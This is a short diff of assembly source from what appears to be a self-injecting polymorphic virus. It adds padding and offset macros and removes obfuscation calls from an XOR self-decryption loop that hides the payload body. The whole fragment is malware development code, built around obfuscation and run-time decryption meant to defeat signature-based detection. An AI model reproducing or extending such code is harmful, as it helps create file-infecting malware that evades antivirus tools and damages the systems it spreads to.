@@ -57,7 +57,7 @@
 %define BEGIN_SIGNATURE_OFFSET_FORM_END _end - signature - 1
 
 %define POLY_OFFSET_1	_start.label_poly1 - _start
-
+%define POLY_CRAP_SKIPPED_OFFSET inject_self.poly_crap_skipped - _start
 
 %macro OBF_POLY_1 0
 	OBF_PUSH_RAX
@@ -75,6 +75,17 @@
 	pop rax
 %endmacro
 
+
+%macro POLY_CRAP_SKIPPED 0
+	.poly_crap_skipped:
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+	dd 0xAAAAAAAA
+%endmacro
 ; MACROS
 
 %macro OBF_GENERIC 0
@@ -375,12 +386,10 @@ db 0xF3
 
 %macro DECYPHER 0
 	xor r11, r11
-	OBF_GENERIC1
 	.key_offset:
 	mov rdi, 0xAA  ; key
 	mov rax, .enc_start
 	lea rdx, [rel .enc_start]
-	OBF_GENERIC2
 	mov rcx, enc_end
 	sub rcx, rax
 	.factor_offset:
@@ -389,7 +398,6 @@ db 0xF3
 		mov r11b, byte [rdx]
 		xor r11, rdi
 		mov byte [rdx], r11b
-	OBF_GENERIC
 		inc rdx
 		dec r12
 		add rdi, r12
